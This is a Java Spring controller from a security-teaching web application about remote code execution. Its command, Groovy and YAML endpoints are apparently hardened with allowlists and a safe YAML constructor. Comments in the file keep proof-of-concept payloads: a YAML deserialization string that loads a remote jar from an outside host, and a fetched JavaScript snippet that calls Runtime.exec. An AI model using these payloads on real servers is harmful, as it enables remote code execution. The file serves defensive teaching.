package org.joychou.controller;

import groovy.lang.Binding;
import groovy.lang.GroovyShell;
import lombok.extern.slf4j.Slf4j;
import org.joychou.security.SecurityUtil;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.util.HtmlUtils;
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.SafeConstructor;

import javax.script.Bindings;
import javax.script.ScriptContext;
import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.sql.DriverManager;


/**
 * Java code execute
 *
 * @author JoyChou @ 2018-05-24
 */
@Slf4j
@RestController
@RequestMapping("/rce")
public class Rce {

    /**
     * Map a command selector to a fixed, hard-coded argv. The user-supplied string is only used
     * to choose between constants; no part of it is ever passed to the process. No shell is involved.
     *
     * @return a fixed argv, or null if the selector is not known
     */
    public static String[] parseAllowedCmd(String cmd) {
        if (cmd == null) {
            return null;
        }
        switch (cmd.trim()) {
            case "whoami":
                return new String[]{"whoami"};
            case "date":
                return new String[]{"date"};
            case "pwd":
                return new String[]{"pwd"};
            case "id":
                return new String[]{"id"};
            case "hostname":
                return new String[]{"hostname"};
            case "uname":
                return new String[]{"uname", "-a"};
            case "ls":
                return new String[]{"ls", "-la"};
            default:
                return null;
        }
    }

    /**
     * Map a selector to a fixed Groovy script. Attacker data is never part of the script source;
     * it is only exposed to the script as the bound variable "input".
     *
     * @return a fixed script, or null if the selector is not known
     */
    private static String selectGroovyScript(String selector) {
        if (selector == null) {
            return null;
        }
        switch (selector.trim()) {
            case "length":
                return "input.length()";
            case "upper":
                return "input.toUpperCase()";
            case "lower":
                return "input.toLowerCase()";
            case "reverse":
                return "input.reverse()";
            default:
                return null;
        }
    }

    @GetMapping("/runtime/exec")
    public String CommandExec(String cmd) {
        Runtime run = Runtime.getRuntime();
        StringBuilder sb = new StringBuilder();

        String[] argv = parseAllowedCmd(cmd);
        if (argv == null) {
            return "Bad boy. I got u.";
        }

        try {
            Process p = run.exec(argv);
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }

            if (p.waitFor() != 0) {
                if (p.exitValue() == 1)
                    return "Command exec failed!!";
            }

            inBr.close();
            in.close();
        } catch (Exception e) {
            log.error("Command execution failed", e);
            return "Command exec failed!!";
        }
        return HtmlUtils.htmlEscape(sb.toString());
    }


    /**
     * <a href="http://localhost:8080/rce/ProcessBuilder?cmd=whoami">POC</a>
     */
    @GetMapping("/ProcessBuilder")
    public String processBuilder(String cmd) {

        StringBuilder sb = new StringBuilder();

        String[] arrCmd = parseAllowedCmd(cmd);
        if (arrCmd == null) {
            return "Bad boy. I got u.";
        }

        try {
            ProcessBuilder processBuilder = new ProcessBuilder(arrCmd);
            Process p = processBuilder.start();
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }
        } catch (Exception e) {
            log.error("Command execution failed", e);
            return "Command exec failed!!";
        }

        return HtmlUtils.htmlEscape(sb.toString());
    }


    /**
     * http://localhost:8080/rce/jscmd?jsurl=http://xx.yy/zz.js
     *
     * curl http://xx.yy/zz.js
     * var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("open -a Calculator");}
     *
     * @param jsurl js url
     */
    @GetMapping("/jscmd")
    public void jsEngine(String jsurl) throws Exception{
        // js nashorn javascript ecmascript
        // Only load scripts from allowlisted http(s) domains (url_safe_domain.xml).
        String safeUrl = SecurityUtil.checkURL(jsurl);
        if (safeUrl == null) {
            throw new IllegalArgumentException("Bad boy. I got u.");
        }
        ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");
        Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);
        // Pass the URL as a bound variable instead of concatenating it into script source.
        bindings.put("jsurl", safeUrl);
        engine.eval("load(jsurl)", bindings);
    }


    /**
     * http://localhost:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20[!!java.net.URLClassLoader%20[[!!java.net.URL%20[%22http://test.joychou.org:8086/yaml-payload.jar%22]]]]
     * yaml-payload.jar: https://github.com/artsploit/yaml-payload
     *
     * @param content payloads
     */
    @GetMapping("/vuln/yarm")
    public void yarm(String content) {
        // SafeConstructor only builds standard YAML types; arbitrary class tags are rejected.
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }

    @GetMapping("/sec/yarm")
    public void secYarm(String content) {
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }

    /**
     * http://localhost:8080/rce/groovy?content=upper&value=hello
     * @param content name of a predefined script (length, upper, lower, reverse)
     * @param value   data the predefined script operates on (bound variable, never evaluated)
     */
    @GetMapping("groovy")
    public String groovyshell(String content, String value) {
        // content only selects a fixed script; user data reaches Groovy only as a binding.
        String script = selectGroovyScript(content);
        if (script == null) {
            throw new IllegalArgumentException("Bad boy. I got u.");
        }
        Binding binding = new Binding();
        binding.setVariable("input", value == null ? "" : value);
        GroovyShell groovyShell = new GroovyShell(binding);
        return HtmlUtils.htmlEscape(String.valueOf(groovyShell.evaluate(script)));
    }



    public static void main(String[] args) throws Exception{
        Runtime.getRuntime().exec("touch /tmp/x");
    }
}

